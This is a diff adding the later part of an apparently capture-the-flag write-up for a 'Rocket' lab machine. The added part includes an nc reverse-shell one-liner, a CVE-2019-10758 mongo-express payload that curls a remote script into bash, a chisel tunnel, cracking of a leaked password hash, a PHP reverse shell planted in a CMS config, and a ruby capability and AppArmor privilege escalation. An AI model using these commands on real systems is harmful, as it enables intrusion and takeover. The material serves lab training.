@@ -192,3 +192,278 @@ changingpassword(target,token)
 input("Start nc listener on your chosen port and press 'Enter'")
 rce(target,ip_address,port)
 ```
+
+At this stage i spent alot of time testing different lines of code, searched for many hours and did countless attempts to get the payload to work. I had to use a modified snipet of code for the payload part from someone else and i manage to get it to work. 
+
+To be honnest, if it wasn't for the information online i could still be working in this payload.
+
+Now we can test my custom rocket.chat exploit to see if we recieve a shell on our attacker machine:
+
+```
+python3 ./rocket_chat_exploit.py -u test@test.com -a admin@rocket.thm -t 'http://chat.rocket.thm' -i my_ip_address -p 9001
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128165312-df1ba041-d709-4673-a02c-ed824590f6c8.png)
+
+Success the exploit worked:
+
+![image](https://user-images.githubusercontent.com/76821053/128165342-18106b2a-cdc1-4031-9ccc-7c915e90067b.png)
+
+After looking around, if we check the environment variables there is a MongoDB Web Interface running on port 8081:
+
+![image](https://user-images.githubusercontent.com/76821053/128165515-f04720a8-3696-4936-9239-629014d073f5.png)
+
+Let explore more and try set up a reverse proxy through the target machine using a tool called “chisel”.
+
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. We can find this tool [here](https://github.com/jpillora/chisel).
+
+To set this up we need to upload this tool to the target machine, the problem is that we cannot use curl or wget to do so. I learned a very usefull way to do it, we are going to copy it through the clipboard.
+
+First we need to encode the app with base64.
+
+```
+cat chisel | base64 -w400 > chisel_encoded
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128165638-b0c12417-a72d-4b59-8227-598fecac8662.png)
+
+Now we need to copy its encoded contents and paste it in the target machine like so:
+
+```
+cat <<EOF > chisel.base64
+```
+
+Now paste it in, with 'shift'+'insert' or 'ctrl'+'+'.
+
+![image](https://user-images.githubusercontent.com/76821053/128165769-8f773a7e-be3b-420e-9b1f-a62e08713b6f.png)
+
+To finnish press enter to give it a new line and break it with command EOF.
+
+![image](https://user-images.githubusercontent.com/76821053/128165989-e1268eb1-c73e-4bf0-9311-f74a65edbcfa.png)
+
+We have to decode the file and give it execute permission so we can run the program:
+
+```
+cat chisel.base64 | base64 -d > chisel
+
+chmod +x chisel
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128166031-adab6953-5216-4af3-99e7-34646cf95618.png)
+
+With “chisel” we need to setup a server on the attacker machine and then a client on the target machine to connect back to our server:
+
+On the attacker machine:
+
+```
+./chisel server -p 8000 --reverse
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128166099-1cf3e47f-f0a0-477d-ab62-b7cf373cdf32.png)
+
+On the client machine:
+
+```
+./chisel client 10.11.23.202:8000 R:8081:172.17.0.4:8081
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128166171-ec457b21-4980-44cf-95e6-c7df55bd63a8.png)
+
+Now we can try and access it through the browser:
+
+![image](https://user-images.githubusercontent.com/76821053/128166223-b0eb3a55-5a07-4489-9a99-dcacc1e5a24e.png)
+
+It asked for credentials. So let use curl to see if we can find more information:
+
+![image](https://user-images.githubusercontent.com/76821053/128166263-a73c7ed6-95c1-4f35-b62d-28ad0560987c.png)
+
+Looking at the curl output we see that MongoDB web interface might be a Mongo-express server.
+
+Searching for more information on Mongo-express i found out that there is an exploit for it with a CVE of CVE-2019-10758.
+
+This exploit is a Remote Code Execution (RCE) via endpoints that use the toBSON method. It allows us to exec commands in a non-safe environment.
+
+Check this [github page](https://github.com/masahiro331/CVE-2019-10758) to see how the exploit works. 
+
+We need to create a bash script payload so we can send it to the Mongo-express server and execute it there:
+
+``` bash
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP_ADDRESS PORT >/tmp/f
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128167014-e97f5f60-a760-4c21-9d30-36a63c6e87a9.png)
+
+Now we have to host the file in a server, we can use python's SimpleHTTPServer to do so. Then we just need to tweak the exploit a bit by asking it to execute curl, download our bash script and pipe it to run with bash:
+
+```
+curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl http://YOUR_IP_ADDRESS:9000/reverse_shell.sh | bash")'
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128167082-89b31731-5b4b-4f56-87ed-dbfa72d687c5.png)
+
+Success we recieve a shell on our nc listener port:
+
+![image](https://user-images.githubusercontent.com/76821053/128167118-66f674ec-ddad-46a5-93ff-80fba3e2e2fe.png)
+
+There aren't any flags on the server, so enumerating further we can find a backups directory.
+
+Inside  /backup/db_backup/meteor there are two files with possible password hashes:
+
+![image](https://user-images.githubusercontent.com/76821053/128167388-0b42be98-1ea8-408e-9b86-3185db3595b3.png)
+
+Since bson.hash is in clear text, lets try and crack it with john the ripper:
+
+```
+echo 'Terrance:$2y$04$cPMSyJolnn5/p0X.B3DMIevZ9M.qiraQw.wY9rgf4DrFp0yLA5DHi' > terrance.hash
+
+john terrance.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128167496-6781d1d6-4e5d-44fc-915e-50576235a107.png)
+
+We have credentials for user “terrance”. We can use them against the http://rocket.thm/bolt/login portal.
+
+![image](https://user-images.githubusercontent.com/76821053/128167540-e1135fa3-33d9-4fd1-85c6-d3d319f48756.png)
+
+We can change a bundles.php file in the “configuration/All configuration files” tab. So i change the content of bundles.php for a php payload from pentestmonkey.
+
+Change this fields on the Pentestmonkey php reverse shell:
+
+![image](https://user-images.githubusercontent.com/76821053/128167625-9d7c2999-7c5a-4314-bafe-32ac833c5210.png)
+
+Edit and save the bundles.php file:
+
+![image](https://user-images.githubusercontent.com/76821053/128167651-5d76dad9-94ea-407b-9cde-dfad1ccfc2b5.png)
+
+Setup the listener, refreshe the page and recieve the shell:
+
+![image](https://user-images.githubusercontent.com/76821053/128167713-23f80bd8-175a-40d2-aefe-ac9a21d93319.png)
+
+Another way is at “Main configuration” where we can change the permissions on the config.yaml to accept file uploads of .php format:
+
+![image](https://user-images.githubusercontent.com/76821053/128167793-9868f140-69d5-4cf5-b607-cf6a82347ed2.png)
+
+Now the server will let us upload a .php file to it:
+
+![image](https://user-images.githubusercontent.com/76821053/128167830-0cdf4748-6567-4674-9a34-1d9e4f94d60e.png)
+
+To trigger the exploit use this option:
+
+![image](https://user-images.githubusercontent.com/76821053/128167868-ce3f0c14-3bb3-4952-b71b-8c8749100d37.png)
+
+And in our listener we recieve a reverse shell.
+
+![image](https://user-images.githubusercontent.com/76821053/128167901-522b2dbf-caa5-4085-850a-6920d72ce299.png)
+
+To upgrade the shell to a fully interactive tty shell in order use commands like sudo, etc.. we can use this command:
+
+```
+python3 -c "__import__('pty').spawn('/bin/bash')"
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128167994-c1562848-521e-4ffb-b568-a0b6ede80362.png)
+
+The user.txt flag is in alvin's home directory:
+
+![image](https://user-images.githubusercontent.com/76821053/128168019-bc8ce694-23bc-43f6-9916-d201c151e5d3.png)
+
+I Transfer linpeas.sh to the target machine to enumerate it further:
+
+![image](https://user-images.githubusercontent.com/76821053/128168087-6acbcd71-37fd-418e-a435-a2d4bd9d6500.png)
+
+And found a privesc that i already exploited in the past:
+
+![image](https://user-images.githubusercontent.com/76821053/128168120-40684297-c130-4ad1-8255-a3611f43137b.png)
+
+When i tried to use sudo i got an error, it didn't work has supposed too.
+
+![image](https://user-images.githubusercontent.com/76821053/128168177-907fadd8-6678-43e5-826b-2bbd80d6f27f.png)
+
+To privesc we need to upgrade our shell to ssh. I had some problems getting ssh to work with user alvin.
+
+I created an ssh private key with ssh-keygen but when i tried to connect to it with ssh i was getting asked for a password everytime.
+
+![image](https://user-images.githubusercontent.com/76821053/128168320-9e161902-3050-46a2-8132-b7cd595fe38a.png)
+
+I'll explain how i solved this issue in a step by step on how i get it working in case you have the same problem.
+
+• First i created a private key with ssh-keygen and didn't set any passphrase:
+
+![image](https://user-images.githubusercontent.com/76821053/128168354-c9dbf03d-9ffe-4873-9118-3c0e7c5b1e0f.png)
+
+• Second - Inside ~/.ssh i create a file called "authorized_keys".
+
+![image](https://user-images.githubusercontent.com/76821053/128168415-e070b180-9821-43b5-ab5f-d60235a2645b.png)
+
+• Third - I copied the contents of id_rsa.pub into authorized_keys file.
+
+![image](https://user-images.githubusercontent.com/76821053/128168491-45454ef1-0fef-495d-a02b-f9d2620dcf38.png)
+
+• Forth - This one here was the main thing i had to do to get it to work, i have change the authorized_keys file permissions to 700.
+
+![image](https://user-images.githubusercontent.com/76821053/128168553-e4997e6b-dd44-4260-9068-d6bcb92260ad.png)
+
+• Fifth - I copied the id_rsa private key to my attacker machine, changed its permissions to 600 and connected to the target machine.
+
+![image](https://user-images.githubusercontent.com/76821053/128168594-bfdf05d0-d36f-4b81-adb4-56244a10641e.png)
+
+Now with a proper shell lets try to exploit “ruby2.5 cap_setuid+ep” capabilities, and for that we can check [GFTOBins](https://gtfobins.github.io/):
+
+![image](https://user-images.githubusercontent.com/76821053/128168632-8e230935-cae7-442a-a8eb-5e0e54aad6c2.png)
+
+First let's check ruby2.5:
+
+![image](https://user-images.githubusercontent.com/76821053/128168654-33127043-9315-4701-993b-85a6efbb12ee.png)
+
+When following the steps i found out that it didn't work:
+
+![image](https://user-images.githubusercontent.com/76821053/128168682-c2c340d9-65f1-4008-b5dd-730738a7e575.png)
+
+We got an error: "Errno::EPERM", it means that the user is not privileged and uid does not match the real UID or saved set-user-ID of the calling process.
+
+I was stuck here for a while, until i discover that apparmor was limiting the capabilities of ruby2.5.
+
+I search the system for ruby2.5:
+
+```
+find / -type f 2>/dev/null | grep ruby
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128168769-e08c020f-1521-442c-a915-97a11dcef495.png)
+
+What is the job of AppArmor?  It's security model is to bind access control attributes to programs rather than to users. Which means ruby2.5 program has a set of binaries that have different permissions and these permissions are controlled by the apparmor defined rules and not the users.
+
+![image](https://user-images.githubusercontent.com/76821053/128168844-1e662697-02d6-40ea-ac62-16a0654a56af.png)
+
+When analizing ruby2.5 apparmor setuid capabilities "/tmp/.X[0-9]-lock rw," has read and write capabilities. Let us try to exploit it!
+ 
+I made a copy of /bin/bash to /tmp and changed its name to match ".X[0-9]-lock" binary and then set the SUID bit to it:
+
+![image](https://user-images.githubusercontent.com/76821053/128169188-72919445-f307-48c9-80eb-f4bd28209769.png)
+
+Running the GTFOBins command we got a diffent error:
+
+![image](https://user-images.githubusercontent.com/76821053/128169229-d1bb22d5-5ebc-4d40-8cd6-feaf06c3f60d.png)
+
+We need our lock binary to maintain privileges, so lets change the GTFOBins command a bit so we can make a new copy of x-lock and see if we can change its ownership:
+
+```
+usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X1-lock /tmp/.X2-lock"'
+```
+
+![image](https://user-images.githubusercontent.com/76821053/128169373-7bb18ef5-06a9-4b97-9730-452c99ee537d.png)
+
+![image](https://user-images.githubusercontent.com/76821053/128169403-64dc9355-e60d-4295-9253-90d44a36fb38.png)
+
+Success, since /bin/bash is disguised has .x2-lock binary in the /tmp directory we can just run it referencing -p for persistence and escalate our privileges!!
+
+![image](https://user-images.githubusercontent.com/76821053/128169452-21c87c60-5956-41e1-81e1-6de400799c04.png)
+
+AND FINALY THE LAST FLAG!
+
+![image](https://user-images.githubusercontent.com/76821053/128169598-ff1dbfa3-a37c-4e7c-8b87-d3cdc7a0f1e7.png)
+
+
